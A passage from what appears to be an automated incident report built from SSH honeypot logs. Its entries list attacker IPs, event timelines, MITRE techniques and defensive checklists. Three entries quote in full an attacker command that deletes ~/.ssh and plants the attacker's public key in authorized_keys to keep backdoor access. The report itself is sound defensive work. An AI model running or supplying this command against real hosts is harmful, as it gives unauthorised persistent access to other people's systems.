| `2026-07-27 11:30:06` | `cowrie.client.kex` |
| `2026-07-27 11:30:08` | `cowrie.login.success` |
| `2026-07-27 11:30:09` | `cowrie.direct-tcpip.request` |
| `2026-07-27 11:30:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `220.246.42[.]227` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4905e43ab81

| Field | Detail |
|---|---|
| **Source IP** | `187.115.144[.]103` |
| **First Seen** | 2026-07-27 11:30 |
| **Last Seen** | 2026-07-27 11:30 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 11:30:40` | `cowrie.session.connect` |
| `2026-07-27 11:30:40` | `cowrie.client.version` |
| `2026-07-27 11:30:40` | `cowrie.client.kex` |
| `2026-07-27 11:30:44` | `cowrie.login.success` |
| `2026-07-27 11:30:46` | `cowrie.direct-tcpip.request` |
| `2026-07-27 11:30:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.115.144[.]103` to AbuseIPDB if not already reported
- [ ] Block `187.115.144[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3831a12057dd

| Field | Detail |
|---|---|
| **Source IP** | `62.220.104[.]155` |
| **First Seen** | 2026-07-27 11:30 |
| **Last Seen** | 2026-07-27 11:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 11:30:51` | `cowrie.session.connect` |
| `2026-07-27 11:30:52` | `cowrie.client.version` |
| `2026-07-27 11:30:52` | `cowrie.client.kex` |
| `2026-07-27 11:30:53` | `cowrie.login.success` |
| `2026-07-27 11:30:54` | `cowrie.direct-tcpip.request` |
| `2026-07-27 11:30:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.220.104[.]155` to AbuseIPDB if not already reported
- [ ] Block `62.220.104[.]155` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b55f3240f8c7

| Field | Detail |
|---|---|
| **Source IP** | `186.16.213[.]54` |
| **First Seen** | 2026-07-27 11:34 |
| **Last Seen** | 2026-07-27 11:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 11:34:51` | `cowrie.session.connect` |
| `2026-07-27 11:34:51` | `cowrie.client.version` |
| `2026-07-27 11:34:51` | `cowrie.client.kex` |
| `2026-07-27 11:34:52` | `cowrie.login.success` |
| `2026-07-27 11:34:53` | `cowrie.session.params` |
| `2026-07-27 11:34:53` | `cowrie.command.input` |
| `2026-07-27 11:34:53` | `cowrie.command.failed` |
| `2026-07-27 11:34:53` | `cowrie.log.closed` |
| `2026-07-27 11:34:54` | `cowrie.session.params` |
| `2026-07-27 11:34:54` | `cowrie.command.input` |
| `2026-07-27 11:34:54` | `cowrie.session.file_download` |
| `2026-07-27 11:34:54` | `cowrie.log.closed` |
| `2026-07-27 11:34:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.16.213[.]54` to AbuseIPDB if not already reported
- [ ] Block `186.16.213[.]54` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f4071e2a9fb

| Field | Detail |
|---|---|
| **Source IP** | `186.16.213[.]54` |
| **First Seen** | 2026-07-27 11:34 |
| **Last Seen** | 2026-07-27 11:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 11:34:54` | `cowrie.session.connect` |
| `2026-07-27 11:34:54` | `cowrie.client.version` |
| `2026-07-27 11:34:54` | `cowrie.client.kex` |
| `2026-07-27 11:34:55` | `cowrie.login.success` |
| `2026-07-27 11:34:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.16.213[.]54` to AbuseIPDB if not already reported
- [ ] Block `186.16.213[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58ab8239308e

| Field | Detail |
|---|---|
| **Source IP** | `186.16.213[.]54` |
| **First Seen** | 2026-07-27 11:34 |
| **Last Seen** | 2026-07-27 11:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 11:34:55` | `cowrie.session.connect` |
| `2026-07-27 11:34:55` | `cowrie.client.version` |
| `2026-07-27 11:34:55` | `cowrie.client.kex` |
| `2026-07-27 11:34:56` | `cowrie.login.success` |
| `2026-07-27 11:34:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.16.213[.]54` to AbuseIPDB if not already reported
- [ ] Block `186.16.213[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-211d9dc41aab

| Field | Detail |
|---|---|
| **Source IP** | `82.65.140[.]218` |
| **First Seen** | 2026-07-27 11:40 |
| **Last Seen** | 2026-07-27 11:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 11:40:47` | `cowrie.session.connect` |
| `2026-07-27 11:40:47` | `cowrie.client.version` |
| `2026-07-27 11:40:47` | `cowrie.client.kex` |
| `2026-07-27 11:40:48` | `cowrie.login.success` |
| `2026-07-27 11:40:48` | `cowrie.direct-tcpip.request` |
| `2026-07-27 11:40:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.65.140[.]218` to AbuseIPDB if not already reported
- [ ] Block `82.65.140[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26e94082ee1d

| Field | Detail |
|---|---|
| **Source IP** | `203.198.173[.]137` |
| **First Seen** | 2026-07-27 11:40 |
| **Last Seen** | 2026-07-27 11:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 11:40:53` | `cowrie.session.connect` |
| `2026-07-27 11:40:54` | `cowrie.client.version` |
| `2026-07-27 11:40:54` | `cowrie.client.kex` |
| `2026-07-27 11:40:56` | `cowrie.login.success` |
| `2026-07-27 11:40:56` | `cowrie.direct-tcpip.request` |
| `2026-07-27 11:41:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.198.173[.]137` to AbuseIPDB if not already reported
- [ ] Block `203.198.173[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0af6f67a4076

| Field | Detail |
|---|---|
| **Source IP** | `155.212.17[.]174` |
| **First Seen** | 2026-07-27 11:54 |
| **Last Seen** | 2026-07-27 11:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 11:54:17` | `cowrie.session.connect` |
| `2026-07-27 11:54:17` | `cowrie.client.version` |
| `2026-07-27 11:54:17` | `cowrie.client.kex` |
| `2026-07-27 11:54:18` | `cowrie.login.success` |
| `2026-07-27 11:54:19` | `cowrie.direct-tcpip.request` |
| `2026-07-27 11:54:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `155.212.17[.]174` to AbuseIPDB if not already reported
- [ ] Block `155.212.17[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94e412a3a07f

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-07-27 11:55 |
| **Last Seen** | 2026-07-27 11:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 11:55:14` | `cowrie.session.connect` |
| `2026-07-27 11:55:15` | `cowrie.client.version` |
| `2026-07-27 11:55:15` | `cowrie.client.kex` |
| `2026-07-27 11:55:16` | `cowrie.login.success` |
| `2026-07-27 11:55:16` | `cowrie.direct-tcpip.request` |
| `2026-07-27 11:55:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-833fae817d3a

| Field | Detail |
|---|---|
| **Source IP** | `123.129.245[.]249` |
| **First Seen** | 2026-07-27 11:58 |
| **Last Seen** | 2026-07-27 11:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 11:58:26` | `cowrie.session.connect` |
| `2026-07-27 11:58:26` | `cowrie.client.version` |
| `2026-07-27 11:58:27` | `cowrie.client.kex` |
| `2026-07-27 11:58:28` | `cowrie.login.success` |
| `2026-07-27 11:58:29` | `cowrie.direct-tcpip.request` |
| `2026-07-27 11:58:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.129.245[.]249` to AbuseIPDB if not already reported
- [ ] Block `123.129.245[.]249` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d313f7d5ad51

| Field | Detail |
|---|---|
| **Source IP** | `190.57.233[.]133` |
| **First Seen** | 2026-07-27 12:02 |
| **Last Seen** | 2026-07-27 12:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 12:02:00` | `cowrie.session.connect` |
| `2026-07-27 12:02:01` | `cowrie.client.version` |
| `2026-07-27 12:02:01` | `cowrie.client.kex` |
| `2026-07-27 12:02:03` | `cowrie.login.success` |
| `2026-07-27 12:02:04` | `cowrie.direct-tcpip.request` |
| `2026-07-27 12:02:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.57.233[.]133` to AbuseIPDB if not already reported
- [ ] Block `190.57.233[.]133` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1a199c6d3d4

| Field | Detail |
|---|---|
| **Source IP** | `161.132.54[.]218` |
| **First Seen** | 2026-07-27 12:09 |
| **Last Seen** | 2026-07-27 12:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 12:09:44` | `cowrie.session.connect` |
| `2026-07-27 12:09:44` | `cowrie.client.version` |
| `2026-07-27 12:09:44` | `cowrie.client.kex` |
| `2026-07-27 12:09:44` | `cowrie.login.success` |
| `2026-07-27 12:09:45` | `cowrie.session.params` |
| `2026-07-27 12:09:45` | `cowrie.command.input` |
| `2026-07-27 12:09:45` | `cowrie.command.failed` |
| `2026-07-27 12:09:46` | `cowrie.log.closed` |
| `2026-07-27 12:09:46` | `cowrie.session.params` |
| `2026-07-27 12:09:46` | `cowrie.command.input` |
| `2026-07-27 12:09:46` | `cowrie.session.file_download` |
| `2026-07-27 12:09:46` | `cowrie.log.closed` |
| `2026-07-27 12:09:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.132.54[.]218` to AbuseIPDB if not already reported
- [ ] Block `161.132.54[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f56bdfb3dee

| Field | Detail |
|---|---|
| **Source IP** | `161.132.54[.]218` |
| **First Seen** | 2026-07-27 12:09 |
| **Last Seen** | 2026-07-27 12:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 12:09:46` | `cowrie.session.connect` |
| `2026-07-27 12:09:46` | `cowrie.client.version` |
| `2026-07-27 12:09:47` | `cowrie.client.kex` |
| `2026-07-27 12:09:47` | `cowrie.login.success` |
| `2026-07-27 12:09:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.132.54[.]218` to AbuseIPDB if not already reported
- [ ] Block `161.132.54[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6308e0c88529

| Field | Detail |
|---|---|
| **Source IP** | `161.132.54[.]218` |
| **First Seen** | 2026-07-27 12:09 |
| **Last Seen** | 2026-07-27 12:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 12:09:47` | `cowrie.session.connect` |
| `2026-07-27 12:09:47` | `cowrie.client.version` |
| `2026-07-27 12:09:47` | `cowrie.client.kex` |
| `2026-07-27 12:09:48` | `cowrie.login.success` |
| `2026-07-27 12:09:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.132.54[.]218` to AbuseIPDB if not already reported
- [ ] Block `161.132.54[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23a12e11f3d4

| Field | Detail |
|---|---|
| **Source IP** | `108.90.216[.]10` |
| **First Seen** | 2026-07-27 12:18 |
| **Last Seen** | 2026-07-27 12:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 12:18:47` | `cowrie.session.connect` |
| `2026-07-27 12:18:47` | `cowrie.client.version` |
| `2026-07-27 12:18:47` | `cowrie.client.kex` |
| `2026-07-27 12:18:49` | `cowrie.login.success` |
| `2026-07-27 12:18:49` | `cowrie.direct-tcpip.request` |
| `2026-07-27 12:18:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `108.90.216[.]10` to AbuseIPDB if not already reported
- [ ] Block `108.90.216[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0eaca7dfb57

| Field | Detail |
|---|---|
| **Source IP** | `36.64.36[.]101` |
| **First Seen** | 2026-07-27 12:19 |
| **Last Seen** | 2026-07-27 12:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 12:19:35` | `cowrie.session.connect` |
| `2026-07-27 12:19:36` | `cowrie.client.version` |
| `2026-07-27 12:19:36` | `cowrie.client.kex` |
| `2026-07-27 12:19:38` | `cowrie.login.success` |
| `2026-07-27 12:19:38` | `cowrie.direct-tcpip.request` |
| `2026-07-27 12:19:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.36[.]101` to AbuseIPDB if not already reported
- [ ] Block `36.64.36[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25d413d0e34a

| Field | Detail |
|---|---|
| **Source IP** | `186.239.41[.]74` |
| **First Seen** | 2026-07-27 12:19 |
| **Last Seen** | 2026-07-27 12:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 12:19:48` | `cowrie.session.connect` |
| `2026-07-27 12:19:48` | `cowrie.client.version` |
| `2026-07-27 12:19:48` | `cowrie.client.kex` |
| `2026-07-27 12:19:50` | `cowrie.login.success` |
| `2026-07-27 12:19:50` | `cowrie.direct-tcpip.request` |
| `2026-07-27 12:19:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.239.41[.]74` to AbuseIPDB if not already reported
- [ ] Block `186.239.41[.]74` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad75aeafbd96

| Field | Detail |
|---|---|
| **Source IP** | `36.93.154[.]207` |
| **First Seen** | 2026-07-27 12:22 |
| **Last Seen** | 2026-07-27 12:22 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 12:22:14` | `cowrie.session.connect` |
| `2026-07-27 12:22:15` | `cowrie.client.version` |
| `2026-07-27 12:22:15` | `cowrie.client.kex` |
| `2026-07-27 12:22:17` | `cowrie.login.success` |
| `2026-07-27 12:22:18` | `cowrie.direct-tcpip.request` |
| `2026-07-27 12:22:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.154[.]207` to AbuseIPDB if not already reported
- [ ] Block `36.93.154[.]207` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-996b4bb62c2d

| Field | Detail |
|---|---|
| **Source IP** | `165.154.200[.]214` |
| **First Seen** | 2026-07-27 12:22 |
| **Last Seen** | 2026-07-27 12:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 12:22:55` | `cowrie.session.connect` |
| `2026-07-27 12:22:55` | `cowrie.client.version` |
| `2026-07-27 12:22:56` | `cowrie.client.kex` |
| `2026-07-27 12:22:57` | `cowrie.login.success` |
| `2026-07-27 12:22:58` | `cowrie.session.params` |
| `2026-07-27 12:22:58` | `cowrie.command.input` |
| `2026-07-27 12:22:58` | `cowrie.command.failed` |
| `2026-07-27 12:22:58` | `cowrie.log.closed` |
| `2026-07-27 12:22:59` | `cowrie.session.params` |
| `2026-07-27 12:22:59` | `cowrie.command.input` |
| `2026-07-27 12:22:59` | `cowrie.session.file_download` |
| `2026-07-27 12:22:59` | `cowrie.log.closed` |
| `2026-07-27 12:23:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.200[.]214` to AbuseIPDB if not already reported
- [ ] Block `165.154.200[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-307e73299d57

| Field | Detail |
|---|---|
| **Source IP** | `165.154.200[.]214` |
| **First Seen** | 2026-07-27 12:23 |
| **Last Seen** | 2026-07-27 12:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 12:23:00` | `cowrie.session.connect` |
| `2026-07-27 12:23:00` | `cowrie.client.version` |
| `2026-07-27 12:23:00` | `cowrie.client.kex` |
| `2026-07-27 12:23:01` | `cowrie.login.success` |
| `2026-07-27 12:23:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.200[.]214` to AbuseIPDB if not already reported
- [ ] Block `165.154.200[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34b7c4cf72db

| Field | Detail |
|---|---|
| **Source IP** | `165.154.200[.]214` |
| **First Seen** | 2026-07-27 12:23 |
| **Last Seen** | 2026-07-27 12:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 12:23:01` | `cowrie.session.connect` |
| `2026-07-27 12:23:01` | `cowrie.client.version` |
| `2026-07-27 12:23:01` | `cowrie.client.kex` |
| `2026-07-27 12:23:02` | `cowrie.login.success` |
| `2026-07-27 12:23:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.200[.]214` to AbuseIPDB if not already reported
- [ ] Block `165.154.200[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44ce3d84a80d

| Field | Detail |
|---|---|
| **Source IP** | `78.197.6[.]173` |
| **First Seen** | 2026-07-27 12:23 |
| **Last Seen** | 2026-07-27 12:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 12:23:17` | `cowrie.session.connect` |
| `2026-07-27 12:23:18` | `cowrie.client.version` |
| `2026-07-27 12:23:18` | `cowrie.client.kex` |
| `2026-07-27 12:23:18` | `cowrie.login.success` |
| `2026-07-27 12:23:19` | `cowrie.direct-tcpip.request` |
| `2026-07-27 12:23:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.197.6[.]173` to AbuseIPDB if not already reported
- [ ] Block `78.197.6[.]173` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fc69c980d01

| Field | Detail |
|---|---|
| **Source IP** | `61.143.227[.]17` |
| **First Seen** | 2026-07-27 12:29 |
| **Last Seen** | 2026-07-27 12:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 12:29:50` | `cowrie.session.connect` |
| `2026-07-27 12:29:50` | `cowrie.client.version` |
| `2026-07-27 12:29:50` | `cowrie.client.kex` |
| `2026-07-27 12:29:53` | `cowrie.login.success` |
| `2026-07-27 12:29:53` | `cowrie.direct-tcpip.request` |
| `2026-07-27 12:29:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.143.227[.]17` to AbuseIPDB if not already reported
